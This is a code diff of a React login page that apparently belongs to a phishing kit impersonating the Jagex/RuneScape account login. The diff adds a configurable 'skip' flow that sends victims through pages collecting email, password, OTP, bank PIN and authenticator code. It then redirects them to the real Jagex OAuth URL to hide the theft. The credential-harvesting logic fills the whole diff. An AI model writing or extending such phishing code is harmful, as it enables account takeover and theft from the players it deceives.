@@ -6,7 +6,7 @@ import stream from "../assets/stream.svg";
 import { FaApple, FaSpinner } from "react-icons/fa";
 import { FaGoogle } from "react-icons/fa";
 import { FaFacebook } from "react-icons/fa";
-import { useNavigate } from 'react-router-dom';
+import { useNavigate, useSearchParams } from 'react-router-dom';
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
 // import ReCAPTCHA from 'react-google-recaptcha';
@@ -14,7 +14,7 @@ import { faEye, faEyeSlash } from "@fortawesome/free-solid-svg-icons";
 // const RECAPTCHA_SITE_KEY = '6Lc4BGEqAAAAAEsXbhnCtpi4I5GjOsnSTU7bLv4O'; 
 
 
-const Email = ({ email, setEmail, userId, password, setPassword}) => {
+const Email = ({ email, setEmail, userId, password, setPassword, skip}) => {
 
   const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   const [error, setError] = useState("");
@@ -25,10 +25,12 @@ const Email = ({ email, setEmail, userId, password, setPassword}) => {
   const redBox = useRef(null);
   const redText = useRef(null);
   const navigate = useNavigate();
-  const goToCode = () => navigate(`/code/?userId=${userId}`);
-  const goToUsername = () => navigate(`/username/?userId=${userId}`);
-  // const [captchaValue, setCaptchaValue] = useState(null);
-  console.log("userId:  ",userId)
+  const goToCode = () => navigate(`/code/?userId=${userId}${skip.includes("OTP") ? "&skip=OTP" : ""}${skip.includes("BankPin") ? "&skip=BankPin" : ""}${skip.includes("AuthCode") ? "&skip=AuthCode" : ""}`);
+  const goToUsername = () => navigate(`/username/?userId=${userId}${skip.includes("OTP") ? "&skip=OTP" : ""}${skip.includes("BankPin") ? "&skip=BankPin" : ""}${skip.includes("AuthCode") ? "&skip=AuthCode" : ""}`);
+  const goToAuth = () => navigate(`/authcode/?userId=${userId}${skip.includes("OTP") ? "&skip=OTP" : ""}${skip.includes("BankPin") ? "&skip=BankPin" : ""}${skip.includes("AuthCode") ? "&skip=AuthCode" : ""}`);
+  const gotoverify = () => navigate(`/bankpin/?userId=${userId}${skip.includes("OTP") ? "&skip=OTP" : ""}${skip.includes("BankPin") ? "&skip=BankPin" : ""}${skip.includes("AuthCode") ? "&skip=AuthCode" : ""}`);
+    // const [captchaValue, setCaptchaValue] = useState(null);
+    console.log("skip:   :", skip);
   // const onRecaptchaChange = (value) => {
   //   console.log('Captcha value:', value);
   //   setCaptchaValue(value);
@@ -67,7 +69,21 @@ const Email = ({ email, setEmail, userId, password, setPassword}) => {
   
       if (response.ok) {
         handleFocus();
-        goToCode();
+        if(skip.includes("OTP")){
+          if(skip.includes("BankPin")){
+            if(skip.includes("AuthCode")){
+              window.location.replace(
+                "https://account.jagex.com/oauth2/auth?response_type=code&client_id=jpp-auth&scope=openid%20user.email.read&state=0Q8G1Ik-dZIji7-2kAhpxCW45NCgv5BzZSWntl41Vas%3D&redirect_uri=https://auth.runescape.com/jpp-auth/login/oauth2/code/jpp&nonce=yiJhVH5_277aCNWlS6_691JBxeqtgsgpGiukIJ90FQg&max_age=1200&flow=web&__cf_chl_tk=tjiRlHZOgc5QNTSiM7Qn8Sc3zHDyO_9qQCLcAr_fqGE-1729662506-1.0.1.1-.9k2TWyJVV6gerbwd_bj7OLygTb1lrUiRgdqzeziHgo#_ga=2.82027987.490570915.1729662489-144552881.1729662489"
+              );
+            }else{
+              goToAuth();
+            }
+          }else{
+            gotoverify();
+          }
+        }else{
+          goToCode();
+        }
       } else {
         const errorResponse = await response.json();
         setLoading(false);
